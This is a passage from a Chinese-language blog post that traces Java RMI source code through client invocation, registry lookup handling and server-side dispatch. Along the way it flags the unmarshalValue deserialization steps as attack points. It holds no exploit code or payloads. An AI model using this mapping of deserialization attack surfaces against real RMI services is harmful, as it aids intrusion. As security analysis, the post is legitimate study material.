marshalValue(types[i], params[i], out);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;IOException marshalling arguments: &quot;</span>, e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MarshalException</span>(<span class="string">&quot;error marshalling arguments&quot;</span>, e);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// unmarshal return</span></span><br><span class="line">            call.executeCall();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Class&lt;?&gt; rtype = method.getReturnType();</span><br><span class="line">                <span class="keyword">if</span> (rtype == <span class="keyword">void</span>.class)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="type">ObjectInput</span> <span class="variable">in</span> <span class="operator">=</span> call.getInputStream();</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* StreamRemoteCall.done() does not actually make use</span></span><br><span class="line"><span class="comment">                 * of conn, therefore it is safe to reuse this</span></span><br><span class="line"><span class="comment">                 * connection before the dirty call is sent for</span></span><br><span class="line"><span class="comment">                 * registered refs.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">returnValue</span> <span class="operator">=</span> unmarshalValue(rtype, in);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* we are freeing the connection now, do not free</span></span><br><span class="line"><span class="comment">                 * again or reuse.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                alreadyFreed = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* if we got to this point, reuse must have been true. */</span></span><br><span class="line">                clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = true)&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">/* Free the call&#x27;s connection early. */</span></span><br><span class="line">                ref.getChannel().free(conn, <span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> returnValue;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF,</span><br><span class="line">                                 <span class="string">&quot;IOException unmarshalling return: &quot;</span>, e);</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">                clientRefLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;ClassNotFoundException unmarshalling return: &quot;</span>, e);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling return&quot;</span>, e);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    call.done();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="comment">/* WARNING: If the conn has been reused early,</span></span><br><span class="line"><span class="comment">                     * then it is too late to recover from thrown</span></span><br><span class="line"><span class="comment">                     * IOExceptions caught here. This code is relying</span></span><br><span class="line"><span class="comment">                     * on StreamRemoteCall.done() not actually</span></span><br><span class="line"><span class="comment">                     * throwing IOExceptions.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    reuse = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RuntimeException e) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Need to distinguish between client (generated by the</span></span><br><span class="line"><span class="comment">             * invoke method itself) and server RuntimeExceptions.</span></span><br><span class="line"><span class="comment">             * Client side RuntimeExceptions are likely to have</span></span><br><span class="line"><span class="comment">             * corrupted the call connection and those from the server</span></span><br><span class="line"><span class="comment">             * are not likely to have done so.  If the exception came</span></span><br><span class="line"><span class="comment">             * from the server the call connection should be reused.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> ((call == <span class="literal">null</span>) ||</span><br><span class="line">                (((StreamRemoteCall) call).getServerException() != e))</span><br><span class="line">            &#123;</span><br><span class="line">                reuse = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">             * Some failure during call; assume connection cannot</span></span><br><span class="line"><span class="comment">             * be reused.  Must assume failure even if ServerException</span></span><br><span class="line"><span class="comment">             * or ServerError occurs since these failures can happen</span></span><br><span class="line"><span class="comment">             * during parameter deserialization which would leave</span></span><br><span class="line"><span class="comment">             * the connection in a corrupted state.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            reuse = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Error e) &#123;</span><br><span class="line">            <span class="comment">/* If errors occurred, the connection is most likely not</span></span><br><span class="line"><span class="comment">             *  reusable.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            reuse = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">throw</span> e;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* alreadyFreed ensures that we do not log a reuse that</span></span><br><span class="line"><span class="comment">             * may have already happened.</span></span><br><span class="line"><span class="comment">             */</span></span><br><span class="line">            <span class="keyword">if</span> (!alreadyFreed) &#123;</span><br><span class="line">                <span class="keyword">if</span> (clientRefLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    clientRefLog.log(Log.BRIEF, <span class="string">&quot;free connection (reuse = &quot;</span> +</span><br><span class="line">                                           reuse + <span class="string">&quot;)&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                ref.getChannel().free(conn, reuse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>还有一个地方，这个方法会将传入的参数传入<code>marshalValue</code>中，这里面是进行序列化操作的，那么有序列化，肯定还有反序列化，就在<code>executeCall</code>后的<code>unmarshalValue</code>方法内，将传回来的参数进行反序列化，这里就又存在一个攻击点</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">static</span> Object <span class="title function_">unmarshalValue</span><span class="params">(Class&lt;?&gt; type, ObjectInput in)</span></span><br><span class="line">        <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (type.isPrimitive()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (type == <span class="type">int</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Integer.valueOf(in.readInt());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">boolean</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Boolean.valueOf(in.readBoolean());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">byte</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Byte.valueOf(in.readByte());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">char</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Character.valueOf(in.readChar());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">short</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Short.valueOf(in.readShort());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">long</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Long.valueOf(in.readLong());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">float</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Float.valueOf(in.readFloat());</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (type == <span class="type">double</span>.class) &#123;</span><br><span class="line">                <span class="keyword">return</span> Double.valueOf(in.readDouble());</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">Error</span>(<span class="string">&quot;Unrecognized primitive type: &quot;</span> + type);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> in.readObject();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="xifa1">客户端请求注册中心-注册中心</h4>
接下来我们看看当客户端请求注册中心的时候，注册中心做了一些什么样的操作

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">IRemoteObj</span> <span class="variable">remoteObj</span> <span class="operator">=</span> (IRemoteObj) registry.lookup(<span class="string">&quot;remoteObj&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>服务端调用Skel，客户端调用Stub，所以断点应该下载RegistryImpl_Skel类中，我们也是需要看下到底是怎么调用到RegistryImpl_Skel中的</p>
<p>我们走到之前的listen方法处，listen方法创建了一个新的线程，主要需要去看AcceptLoop里面的run方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">listen</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">        <span class="keyword">assert</span> Thread.holdsLock(<span class="built_in">this</span>);</span><br><span class="line">        <span class="type">TCPEndpoint</span> <span class="variable">ep</span> <span class="operator">=</span> getEndpoint();</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> ep.getPort();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (server == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                tcpLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;(port &quot;</span> + port + <span class="string">&quot;) create server socket&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                server = ep.newServerSocket();</span><br><span class="line">                <span class="comment">/*</span></span><br><span class="line"><span class="comment">                 * Don&#x27;t retry ServerSocket if creation fails since</span></span><br><span class="line"><span class="comment">                 * &quot;port in use&quot; will cause export to hang if an</span></span><br><span class="line"><span class="comment">                 * RMIFailureHandler is not installed.</span></span><br><span class="line"><span class="comment">                 */</span></span><br><span class="line">                <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> AccessController.doPrivileged(</span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">NewThreadAction</span>(<span class="keyword">new</span> <span class="title class_">AcceptLoop</span>(server),</span><br><span class="line">                                        <span class="string">&quot;TCP Accept-&quot;</span> + port, <span class="literal">true</span>));</span><br><span class="line">                t.start();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.net.BindException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Port already in use: &quot;</span> + port, e);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ExportException</span>(<span class="string">&quot;Listen failed on port: &quot;</span> + port, e);</span><br><span class="line">            &#125;</span><br><span class="line">        ......</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>在AcceptLoop的run方法中，其实并没有什么东西，只有一个executeAcceptLoop方法，走入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                executeAcceptLoop();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="comment">/*</span></span><br><span class="line"><span class="comment">                     * Only one accept loop is started per server</span></span><br><span class="line"><span class="comment">                     * socket, so after no more connections will be</span></span><br><span class="line"><span class="comment">                     * accepted, ensure that the server socket is no</span></span><br><span class="line"><span class="comment">                     * longer listening.</span></span><br><span class="line"><span class="comment">                     */</span></span><br><span class="line">                    serverSocket.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>在executeAcceptLoop方法中，创建了新的线程ConnectionHandler</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">executeAcceptLoop</span><span class="params">()</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">               tcpLog.log(Log.BRIEF, <span class="string">&quot;listening on port &quot;</span> +</span><br><span class="line">                          getEndpoint().getPort());</span><br><span class="line">           &#125;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="type">Socket</span> <span class="variable">socket</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   socket = serverSocket.accept();</span><br><span class="line"></span><br><span class="line">                   <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    * Find client host name (or &quot;0.0.0.0&quot; if unknown)</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                   <span class="type">InetAddress</span> <span class="variable">clientAddr</span> <span class="operator">=</span> socket.getInetAddress();</span><br><span class="line">                   <span class="type">String</span> <span class="variable">clientHost</span> <span class="operator">=</span> (clientAddr != <span class="literal">null</span></span><br><span class="line">                                        ? clientAddr.getHostAddress()</span><br><span class="line">                                        : <span class="string">&quot;0.0.0.0&quot;</span>);</span><br><span class="line"></span><br><span class="line">                   <span class="comment">/*</span></span><br><span class="line"><span class="comment">                    * Execute connection handler in the thread pool,</span></span><br><span class="line"><span class="comment">                    * which uses non-system threads.</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                   <span class="keyword">try</span> &#123;</span><br><span class="line">                       connectionThreadPool.execute(</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">ConnectionHandler</span>(socket, clientHost));</span><br><span class="line">                   &#125; <span class="keyword">catch</span> (RejectedExecutionException e) &#123;</span><br><span class="line">                       closeSocket(socket);</span><br><span class="line">                       tcpLog.log(Log.BRIEF,</span><br><span class="line">                                  <span class="string">&quot;rejected connection from &quot;</span> + clientHost);</span><br><span class="line">                   &#125;</span><br><span class="line"></span><br><span class="line">               &#125; </span><br><span class="line">               ......</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure>

<p>我们看TCPTransport的run方法，在其被调用时，其方法内部会调用run0方法</p>
<p>其中较为重要的就是handleMessages</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// TCPTransport#run</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">t</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> t.getName();</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                t.setName(<span class="string">&quot;RMI TCP Connection(&quot;</span> +</span><br><span class="line">                          connectionCount.incrementAndGet() +</span><br><span class="line">                          <span class="string">&quot;)-&quot;</span> + remoteHost);</span><br><span class="line">                AccessController.doPrivileged((PrivilegedAction&lt;Void&gt;)() -&gt; &#123;</span><br><span class="line">                    run0();</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;, NOPERMS_ACC);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                t.setName(name);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TCPTransport#run0</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">run0</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">            ......</span><br><span class="line">                    <span class="comment">// read input messages</span></span><br><span class="line">                    handleMessages(conn, <span class="literal">true</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">              ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在handleMessages方法中，op在默认情况下都是TransportConstants.Call，所以最后会调用到serviceCall方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">handleMessages</span><span class="params">(Connection conn, <span class="type">boolean</span> persistent)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> getEndpoint().getPort();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">DataInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(conn.getInputStream());</span><br><span class="line">            <span class="keyword">do</span> &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">op</span> <span class="operator">=</span> in.read();     <span class="comment">// transport op</span></span><br><span class="line">                <span class="keyword">if</span> (op == -<span class="number">1</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                        tcpLog.log(Log.BRIEF, <span class="string">&quot;(port &quot;</span> +</span><br><span class="line">                            port + <span class="string">&quot;) connection closed&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (tcpLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                    tcpLog.log(Log.BRIEF, <span class="string">&quot;(port &quot;</span> + port +</span><br><span class="line">                        <span class="string">&quot;) op = &quot;</span> + op);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span> (op) &#123;</span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Call:</span><br><span class="line">                    <span class="comment">// service incoming RMI call</span></span><br><span class="line">                    <span class="type">RemoteCall</span> <span class="variable">call</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamRemoteCall</span>(conn);</span><br><span class="line">                    <span class="keyword">if</span> (serviceCall(call) == <span class="literal">false</span>)</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">case</span> TransportConstants.Ping:</span><br><span class="line">                 ......</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">while</span> (persistent);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>serviceCall方法中会从静态表中读取处Targert</p>
<p>此时serviceCall中disp是一个RegistryImpl_Skel类，该方法会从target中提取出dispatcher</p>
<p>最后会调用到disp.dispatch方法，进入到RegistryImpl_Skel类的dispatch方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">serviceCall</span><span class="params">(<span class="keyword">final</span> RemoteCall call)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ......</span><br><span class="line">            <span class="type">Transport</span> <span class="variable">transport</span> <span class="operator">=</span> id.equals(dgcID) ? <span class="literal">null</span> : <span class="built_in">this</span>;</span><br><span class="line">            <span class="type">Target</span> <span class="variable">target</span> <span class="operator">=</span></span><br><span class="line">                ObjectTable.getTarget(<span class="keyword">new</span> <span class="title class_">ObjectEndpoint</span>(id, transport));</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> (target == <span class="literal">null</span> || (impl = target.getImpl()) == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchObjectException</span>(<span class="string">&quot;no such object in table&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> <span class="type">Dispatcher</span> <span class="variable">disp</span> <span class="operator">=</span> target.getDispatcher();</span><br><span class="line">            target.incrementCallCount();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">/* call the dispatcher */</span></span><br><span class="line">                transportLog.log(Log.VERBOSE, <span class="string">&quot;call dispatcher&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">final</span> <span class="type">AccessControlContext</span> <span class="variable">acc</span> <span class="operator">=</span></span><br><span class="line">                    target.getAccessControlContext();</span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">ccl</span> <span class="operator">=</span> target.getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="type">ClassLoader</span> <span class="variable">savedCcl</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    setContextClassLoader(ccl);</span><br><span class="line">                    currentTransport.set(<span class="built_in">this</span>);</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        java.security.AccessController.doPrivileged(</span><br><span class="line">                            <span class="keyword">new</span> <span class="title class_">java</span>.security.PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">                            <span class="keyword">public</span> Void <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                                checkAcceptPermission(acc);</span><br><span class="line">                                disp.dispatch(impl, call);</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;, acc);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (java.security.PrivilegedActionException pae) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> (IOException) pae.getException();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    setContextClassLoader(savedCcl);</span><br><span class="line">                    currentTransport.set(<span class="literal">null</span>);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ex) &#123;</span><br><span class="line">                transportLog.log(Log.BRIEF,</span><br><span class="line">                                 <span class="string">&quot;exception thrown by dispatcher: &quot;</span>, ex);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                target.decrementCallCount();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (RemoteException e) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if calls are being logged, write out exception</span></span><br><span class="line">            <span class="keyword">if</span> (UnicastServerRef.callLog.isLoggable(Log.BRIEF)) &#123;</span><br><span class="line">                <span class="comment">// include client host name if possible</span></span><br><span class="line">                <span class="type">String</span> <span class="variable">clientHost</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    clientHost = <span class="string">&quot;[&quot;</span> +</span><br><span class="line">                        RemoteServer.getClientHost() + <span class="string">&quot;] &quot;</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (ServerNotActiveException ex) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> clientHost + <span class="string">&quot;exception: &quot;</span>;</span><br><span class="line">                UnicastServerRef.callLog.log(Log.BRIEF, message, e);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ObjectOutput</span> <span class="variable">out</span> <span class="operator">=</span> call.getResultStream(<span class="literal">false</span>);</span><br><span class="line">                UnicastServerRef.clearStackTraces(e);</span><br><span class="line">                out.writeObject(e);</span><br><span class="line">                call.releaseOutputStream();</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException ie) &#123;</span><br><span class="line">                transportLog.log(Log.BRIEF,</span><br><span class="line">                    <span class="string">&quot;exception thrown marshalling exception: &quot;</span>, ie);</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="sUKII">客户端请求服务端-服务端</h2>
服务端和注册中心的流程其实一样，当客户端去调用服务端远程方法时，最后也会进入serviceCall方法，调用dispatch方法

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">disp.dispatch(impl, call);</span><br></pre></td></tr></table></figure>

<p>进入dispatch方法后，我们可以看到，当skel为null的时候，才能走到下面的代码，第一个target为DGC，此时skel不为空直接返回</p>
<p>当我们请求到服务端动态代理后，发现skel为空，则不会直接返回而是走到下面的代码。</p>
<p>首先会读取输入流，从输入流中先获取到method，就是我们所调用的sayhello方法</p>
<p>接下来会将我们的参数用unmarshalValue反序列化出来，再调用method.invoke方法去调用我们所调用的sayHello方法，然后会用marshalValue将函数的返回值result序列化进去，将其传回客户端</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dispatch</span><span class="params">(Remote obj, RemoteCall call)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="comment">// positive operation number in 1.1 stubs;</span></span><br><span class="line">        <span class="comment">// negative version number in 1.2 stubs and beyond...</span></span><br><span class="line">        <span class="type">int</span> num;</span><br><span class="line">        <span class="type">long</span> op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// read remote call header</span></span><br><span class="line">            ObjectInput in;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                in = call.getInputStream();</span><br><span class="line">                num = in.readInt();</span><br><span class="line">                <span class="keyword">if</span> (num &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (skel != <span class="literal">null</span>) &#123;</span><br><span class="line">                        oldDispatch(obj, call, num);</span><br><span class="line">                        <span class="keyword">return</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                            <span class="string">&quot;skeleton class not found but required &quot;</span> +</span><br><span class="line">                            <span class="string">&quot;for client version&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                op = in.readLong();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception readEx) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;error unmarshalling call header&quot;</span>,</span><br><span class="line">                                             readEx);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">MarshalInputStream</span> <span class="variable">marshalStream</span> <span class="operator">=</span> (MarshalInputStream) in;</span><br><span class="line">            marshalStream.skipDefaultResolveClass();</span><br><span class="line"></span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> hashToMethod_Map.get(op);</span><br><span class="line">            <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(<span class="string">&quot;unrecognized method hash: &quot;</span> +</span><br><span class="line">                    <span class="string">&quot;method not supported by remote object&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// if calls are being logged, write out object id and operation</span></span><br><span class="line">            logCall(obj, method);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// unmarshal parameters</span></span><br><span class="line">            Class&lt;?&gt;[] types = method.getParameterTypes();</span><br><span class="line">            Object[] params = <span class="keyword">new</span> <span class="title class_">Object</span>[types.length];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                unmarshalCustomCallData(in);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; types.length; i++) &#123;</span><br><span class="line">                    params[i] = unmarshalValue(types[i], in);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.io.IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnmarshalException</span>(</span><br><span class="line">                    <span class="string">&quot;error unmarshalling arguments&quot;</span>, 